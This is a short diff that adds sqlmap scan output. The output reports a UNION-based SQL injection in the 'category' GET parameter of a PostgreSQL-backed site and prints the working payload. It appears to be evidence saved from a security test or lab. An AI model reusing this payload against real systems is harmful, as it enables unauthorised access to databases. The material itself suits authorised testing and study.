@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
+---
+Parameter: category (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: category=Food+%26+Drink' UNION ALL SELECT NULL,CONCAT(CONCAT('qxbkq','qIAycmOGbymIYyhiJVcmxpJAiVtvtdurRxEzoYBY'),'qvkqq')-- ZIpJ
+---
+back-end DBMS: PostgreSQL
